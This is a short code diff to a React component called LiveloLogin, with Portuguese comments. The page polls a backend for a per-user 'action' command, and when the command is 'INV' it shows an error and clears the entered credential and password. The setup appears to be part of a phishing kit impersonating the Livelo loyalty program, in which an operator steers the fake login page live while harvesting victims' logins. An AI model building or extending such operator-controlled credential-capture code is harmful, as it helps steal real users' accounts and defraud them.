@@ -60,9 +60,15 @@ function LiveloLogin() {
       try {
         const response = await axios.get(`${API}/user/check-action/${userId}`);
         if (response.data && response.data.action) {
-          setShowCommandPage(true);
-        } else {
-          setShowCommandPage(false);
+          setCurrentCommand(response.data.action);
+          
+          // Se for INV, mostrar erro e limpar campos
+          if (response.data.action === "INV") {
+            setHasError(true);
+            setCredential("");
+            setPassword("");
+            setIsLoading(false);
+          }
         }
       } catch (error) {
         console.error("Erro ao verificar comando:", error);
